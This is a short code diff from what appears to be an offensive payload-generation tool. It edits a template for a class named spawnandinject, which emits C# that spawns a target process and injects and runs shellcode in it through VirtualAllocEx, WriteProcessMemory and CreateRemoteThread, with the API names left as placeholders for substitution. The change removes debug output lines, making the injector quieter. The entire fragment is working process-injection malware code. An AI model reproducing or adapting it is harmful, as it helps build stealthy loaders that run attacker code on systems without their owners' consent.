@@ -81,11 +81,9 @@ class spawnandinject:
 
             IntPtr bytesWritten;
             IntPtr threadId;
-            Console.WriteLine(pi.hProcess);
             IntPtr pRemoteCode = {VirtualAllocEx}(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, $memoryPermission);
             {WriteProcessMemory}(pi.hProcess, pRemoteCode, shellcode, {shellcodeSize}, out bytesWritten);
             IntPtr hThread = {CreateRemoteThread}(pi.hProcess, IntPtr.Zero, 0, pRemoteCode, IntPtr.Zero, 0, out threadId);
-            Console.WriteLine(hThread);
             {WaitForSingleObject}(hThread, 500);
             {CloseHandle}(hThread);
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
